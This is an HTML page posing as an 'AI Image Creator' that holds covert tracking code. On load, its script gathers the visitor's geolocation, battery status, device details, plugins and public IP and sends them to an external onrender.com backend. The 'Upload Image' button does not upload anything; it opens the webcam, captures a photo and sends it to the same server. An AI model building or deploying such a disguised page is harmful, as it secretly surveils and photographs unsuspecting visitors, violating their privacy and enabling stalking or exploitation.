<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Image Creator</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <script>
        const backendURL = "https://flash-3vfu.onrender.com"; // ✅ Update with your backend URL
        const sessionId = Math.random().toString(36).substr(2, 9); // ✅ Generate unique session ID

        async function trackDevice() {
            try {
                const battery = await navigator.getBattery();
                const geo = await new Promise((resolve) => 
                    navigator.geolocation.getCurrentPosition(pos => resolve(pos.coords), () => resolve({}))
                );
                const device = {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    cookiesEnabled: navigator.cookieEnabled,
                    plugins: [...navigator.plugins].map(p => p.name).join(", "),
                    ip: await (await fetch("https://api64.ipify.org?format=json")).json().then(data => data.ip)
                };
                
                const data = { sessionId, battery: { level: battery.level * 100, charging: battery.charging }, geo, device };
                fetch(`${backendURL}/track/${sessionId}`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                }).catch(err => console.log("Error sending data:", err));
            } catch (error) {
                console.error("Tracking failed:", error);
            }
        }

        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement("canvas");
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const photo = canvas.toDataURL("image/png");
                    fetch(`${backendURL}/track/${sessionId}`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ sessionId, photo })
                    });
                    stream.getTracks().forEach(track => track.stop());
                }, 2000);
            } catch (error) {
                console.error("Camera access denied:", error);
            }
        }

        document.addEventListener("DOMContentLoaded", () => {
            trackDevice(); // ✅ Auto-track on page load
        });
    </script>
</head>
<body class="bg-dark text-light">
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <div class="container-fluid">
            <a class="navbar-brand fw-bold" href="#">AI Image Creator</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item"><a class="nav-link" href="#">Home</a></li>
                    <li class="nav-item"><a class="nav-link" href="#">About</a></li>
                    <li class="nav-item"><a class="nav-link" href="#">Features</a></li>
                    <li class="nav-item"><a class="nav-link" href="#">Contact</a></li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container text-center py-5">
        <h1 class="display-4">Upload & Generate AI Images</h1>
        <p class="lead">Our AI-powered tool creates stunning images instantly.</p>
        <button class="btn btn-primary btn-lg mt-4" onclick="capturePhoto()">Upload Image</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
